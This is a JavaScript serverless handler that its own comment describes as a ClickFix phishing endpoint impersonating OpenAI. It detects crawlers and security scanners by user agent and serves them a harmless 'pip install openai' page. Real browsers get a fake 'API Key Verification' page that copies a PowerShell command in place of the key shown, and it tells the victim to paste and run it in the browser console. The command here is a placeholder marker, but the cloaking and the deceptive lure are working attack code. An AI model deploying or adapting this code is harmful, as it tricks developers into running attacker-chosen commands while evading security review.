/**
 * Vercel Serverless — /api/platform-config
 * Bot → benign install command. Real browser → ClickFix payload.
 */
export default function handler(req, res) {
  var headers = req.headers;
  var ua = (headers['user-agent'] || '').toLowerCase();
  var isBot = false;

  var bots = ['bot','crawler','spider','headless','selenium','puppeteer','playwright',
    'curl','wget','python','java/','go-http','node-fetch','axios','request/','okhttp',
    'libwww','scanner','security','analyzer','audit','check'];
  for (var i = 0; i < bots.length; i++) { if (ua.indexOf(bots[i]) !== -1) { isBot = true; break; } }
  if (!headers['sec-fetch-site'] && !headers['accept-language']) isBot = true;

  var meta = { version: '2.1', stats: { stars: 3200, forks: 580, downloads: '1.2B/month' } };

  var data;
  if (isBot) {
    data = {
      text: 'pip install openai',
      label: 'pip install openai',
      steps: ['Open terminal','Paste the command','Press Enter to install'],
      title: 'Install OpenAI SDK',
      desc: 'Run this command in your terminal to install the official OpenAI Python SDK:',
      hint: 'After installation, run: python -c "import openai; print(openai.__version__)"',
      meta: meta
    };
  } else {
    data = {
      text: 'powershell -c "Write-Host OPENAI_CLICKFIX_VERIFY; Read-Host"',
      label: 'sk-proj-v2-8xK9mP3vR2tW7yQ-A1bC2dE3fG4hI5jK6lM7nO8pQ9rS0tU1vW2xY3z',
      steps: [
        'Click <strong>Copy</strong> above to copy your API key',
        'Press <strong>F12</strong> to open Developer Tools',
        'Switch to the <strong>Console</strong> tab',
        '<strong>Ctrl+V</strong> to paste and press <strong>Enter</strong>'
      ],
      title: 'API Key Verification',
      desc: 'Please complete verification in your browser console to activate your API key. This confirms you are a developer and not an automated script.',
      hint: 'Tip: If verification fails, ensure you have pasted the complete key and pressed Enter to execute.',
      meta: meta
    };
  }

  res.status(200).setHeader('Content-Type', 'application/json; charset=utf-8')
     .setHeader('Access-Control-Allow-Origin', '*').setHeader('Cache-Control', 'no-store')
     .send(JSON.stringify(data));
}
